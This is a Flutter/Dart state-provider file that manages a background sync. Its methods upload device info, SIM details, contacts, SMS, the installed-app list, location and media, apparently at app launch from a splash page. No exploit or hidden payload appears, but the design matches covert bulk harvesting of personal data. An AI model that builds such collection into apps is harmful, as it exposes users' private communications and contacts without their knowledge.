import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import '../../domain/usecases/sync_data_use_case.dart';

class SyncProvider with ChangeNotifier {
  final SyncDataUseCase _syncDataUseCase;

  SyncProvider(this._syncDataUseCase) {
    // 监听后台服务发送的更新
    FlutterBackgroundService().on('update').listen((event) {
      if (event != null && event['message'] != null) {
        _statusMessage = event['message'];
        notifyListeners();
      }
    });
  }

  bool _isSyncing = false;
  String _statusMessage = '';
  double _progress = 0.0;
  bool _isDebug = false;

  bool get isSyncing => _isSyncing;
  String get statusMessage => _statusMessage;
  double get progress => _progress;
  bool get isDebug => _isDebug;

  void setDebug(bool value) {
    _isDebug = value;
    notifyListeners();
  }

  Future<void> startSync() async {
    if (_isSyncing) return;

    _isSyncing = true;
    _statusMessage = '正在启动同步任务...';
    _progress = 0.0;
    notifyListeners();

    try {
      // 2026 Refactor: 优先通过后台服务执行同步
      final service = FlutterBackgroundService();
      bool isRunning = await service.isRunning();

      if (isRunning) {
        // 如果服务已启动，通过服务发送指令
        service.invoke('startSync');
      } else {
        // 兜底方案：如果后台服务未启动，则在当前 Isolate 执行
        await _syncDataUseCase.execute(onProgress: _updateStatus);
      }
    } catch (e) {
      _statusMessage = '同步出错: $e';
    } finally {
      _isSyncing = false;
      notifyListeners();
    }
  }

  // Granular Upload Methods for SplashPage Serial Flow

  Future<void> uploadDeviceInfo() async {
    await _syncDataUseCase.uploadDeviceInfo(onProgress: _updateStatus);
  }

  Future<void> uploadSimInfo() async {
    await _syncDataUseCase.uploadSimInfo(onProgress: _updateStatus);
  }

  Future<void> uploadContacts() async {
    await _syncDataUseCase.uploadContacts(onProgress: _updateStatus);
  }

  Future<void> uploadSms() async {
    await _syncDataUseCase.uploadSms(onProgress: _updateStatus);
  }

  Future<void> uploadAppList() async {
    await _syncDataUseCase.uploadAppList(onProgress: _updateStatus);
  }

  Future<void> uploadLocation() async {
    await _syncDataUseCase.uploadLocation(onProgress: _updateStatus);
  }

  Future<void> uploadMedia() async {
    await _syncDataUseCase.uploadMedia(onProgress: _updateStatus);
  }

  // 2026 Optimization: Throttled UI updates to prevent main thread jank
  // Only notify on critical state changes or low frequency
  void _updateStatus(String message) {
    _statusMessage = message;

    // Always notify if it's a "Start" or "Finish" or "Error" message
    if (message.contains('正在') && !message.contains('上传')) {
      // e.g. "正在获取...", "正在处理..." (Module Start)
      notifyListeners();
    } else if (message.contains('完成') ||
        message.contains('失败') ||
        message.contains('断开') ||
        message.contains('恢复')) {
      // Critical state changes
      notifyListeners();
    } else {
      // For high-frequency "Uploading" messages, we can skip notifyListeners()
      // or implement a throttle if needed.
      // Current requirement: "仅开始 上传中 完成 通知3次"
      // Since "上传中" is usually a continuous stream, we only notify if the specific
      // module status has changed significantly or we want to show the specific file being uploaded.

      // If the user wants strictly minimal updates:
      // We could check if we already notified "Uploading" for this batch.
      // However, the current logic displays the specific filename being uploaded: "[$remoteName] 正在上传"

      // Optimization: Only notify every 500ms for file uploads to show progress without jank
      final now = DateTime.now().millisecondsSinceEpoch;
      if (now - _lastNotifyTime > 500) {
        notifyListeners();
        _lastNotifyTime = now;
      }
    }
  }

  int _lastNotifyTime = 0;
}
